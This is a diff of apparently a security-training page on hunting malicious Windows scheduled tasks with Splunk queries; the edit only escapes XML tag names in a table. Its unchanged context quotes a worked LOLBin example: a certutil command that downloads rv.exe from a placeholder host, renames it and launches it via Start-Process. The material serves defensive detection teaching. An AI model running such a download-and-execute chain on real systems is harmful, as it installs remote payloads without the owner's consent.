@@ -33,9 +33,9 @@ export default {
       blocks: [
         { t: "cmd", label: "start broad — don't filter by host yet, to see if it's isolated or widespread", code: "index=\"win-alert\" EventCode=4698 <TaskName>\n| table _time EventCode user_name host Task_Name Message" },
         { t: "table", head: ["Task XML section", "What it tells you"], rows: [
-          ["<Triggers><CalendarTrigger>", "when/how often — a daily recurrence on a single workstation is itself a red flag (legit recurring tasks skew server-side)"],
-          ["<Actions><Exec><Command>/<Arguments>", "what actually runs — read the full command line, LOLBin download-rename-launch chains hide here"],
-          ["<Principals><Principal><UserId>", "which account's context the task executes under"],
+          ["<code>&lt;Triggers&gt;&lt;CalendarTrigger&gt;</code>", "when/how often — a daily recurrence on a single workstation is itself a red flag (legit recurring tasks skew server-side)"],
+          ["<code>&lt;Actions&gt;&lt;Exec&gt;&lt;Command&gt;</code>/<code>&lt;Arguments&gt;</code>", "what actually runs — read the full command line, LOLBin download-rename-launch chains hide here"],
+          ["<code>&lt;Principals&gt;&lt;Principal&gt;&lt;UserId&gt;</code>", "which account's context the task executes under"],
         ]},
         { t: "note", kind: "danger", title: "worked example — a full LOLBin chain in one command line", text: "<code>certutil.exe -urlcache -f http://&lt;domain&gt;:9876/rv.exe C:\\Users\\...\\Temp\\DataCollector.exe; Start-Process C:\\Users\\...\\Temp\\DataCollector.exe</code> — download via certutil, rename to a plausible-looking filename, launch via Start-Process, all as a single scheduled-task action. Same LOLBin roster as the earlier <b>Living Off the Land</b> material — certutil as downloader, PowerShell Start-Process as the launcher." },
         { t: "cmd", label: "pivot on the event's own Process ID field to find the parent process", code: "index=\"win-alert\" <ClientProcessId>\n| table _time host Image ParentImage CommandLine" },
